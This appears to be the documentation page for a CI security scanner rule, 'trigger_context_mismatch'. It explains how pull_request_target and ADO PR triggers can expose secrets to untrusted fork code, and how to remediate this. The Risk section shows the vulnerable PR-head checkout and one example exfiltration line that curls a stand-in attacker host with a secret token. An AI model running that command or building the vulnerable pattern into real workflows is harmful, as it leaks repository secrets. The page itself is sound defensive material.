# Trigger Context Mismatch

**Rule ID:** `trigger_context_mismatch`
**Severity:** Critical (`pull_request_target`) / High (ADO `pr:` trigger)
**Category:** Privilege
**Tags:** security, privilege-escalation

## Detection

taudit reads the graph-level `META_TRIGGER` metadata set by the parser. When the trigger is `pull_request_target` (GHA) or `pr` (ADO), and at least one Step in the graph holds authority (has `HasAccessTo` a Secret or Identity), the rule fires once per workflow. It aggregates all authority-holding steps into a single finding.

## Risk

This is the number-one source of GitHub Actions secret exfiltration incidents, and it has affected major open-source projects and enterprises alike.

The mechanism:

1. Your workflow is triggered by `pull_request_target`. This trigger runs in the context of the **base repository** — it has access to repository secrets and the GITHUB_TOKEN has write permissions to the base branch.
2. An external contributor forks your repository and opens a pull request.
3. Your `pull_request_target` workflow checks out the PR head ref:
   ```yaml
   - uses: actions/checkout@v4
     with:
       ref: ${{ github.event.pull_request.head.sha }}
   ```
4. The attacker has now put their code on your privileged runner. Their code runs with full access to your secrets.
5. Exfiltration: the attacker's workflow step executes `curl https://attacker.com/collect?token=$SECRET`.

The `pull_request` trigger (without `_target`) does **not** have this problem — it runs in the fork's context and has no access to base repository secrets. `pull_request_target` was designed for trusted automation that needs write access (labelers, auto-assigners) without checking out untrusted code.

For ADO, the `pr:` trigger runs untrusted contributor code against your pipeline configuration. If the pipeline has access to variable groups or service connections, those are reachable from the PR code.

## Remediation

1. **The safe pattern — use `pull_request` instead of `pull_request_target`:**
   ```yaml
   on:
     pull_request:  # safe — no base repo secrets
       types: [opened, synchronize]
   ```
   If you need both (e.g., to auto-label with write access), split into two workflows.

2. **If you must use `pull_request_target` — never check out the PR head:**
   ```yaml
   on:
     pull_request_target:
   
   jobs:
     # This job is safe — it never checks out PR code
     label:
       runs-on: ubuntu-latest
       steps:
         - uses: actions/labeler@<sha>
           with:
             repo-token: ${{ secrets.GITHUB_TOKEN }}
   ```

3. **If you must run PR code with `pull_request_target` — use `workflow_run`:**
   Run a separate, unprivileged workflow on `pull_request` to build and test the PR code. Use `workflow_run` to trigger a privileged workflow only after the build succeeds — and even then, do not pass the PR code into the privileged workflow.

   ```yaml
   # ci.yml — triggered on PR, no secrets
   on: pull_request
   jobs:
     test:
       runs-on: ubuntu-latest
       steps:
         - uses: actions/checkout@<sha>
         - run: ./test.sh
   
   # deploy.yml — triggered when ci.yml completes
   on:
     workflow_run:
       workflows: ["CI"]
       types: [completed]
   # Has secrets but never checks out PR code
   ```

4. **For ADO PR pipelines:** Remove all variable group references and service connection usages from the PR pipeline. Use a separate CD pipeline with environment approvals for deployments.

5. **Verify:** Re-run `taudit scan`. If the finding persists, check whether any step in the flagged workflow still holds authority (uses a secret or has GITHUB_TOKEN scoped to write). If you have legitimately split the workflows, confirm the PR-triggered one has no authority.

## See also

- [checkout_self_pr_exposure](checkout_self_pr_exposure.md) — fires on the checkout itself (this rule fires on the broader authority access pattern)
- [variable_group_in_pr_job](variable_group_in_pr_job.md) — ADO-specific: variable group in PR context
- [GitHub Actions — `pull_request_target` security](https://securitylab.github.com/research/github-actions-preventing-pwn-requests/)
- [GitHub Blog — Keeping your GitHub Actions workflows secure](https://github.blog/security/vulnerability-research/github-actions-preventing-pwn-requests/)
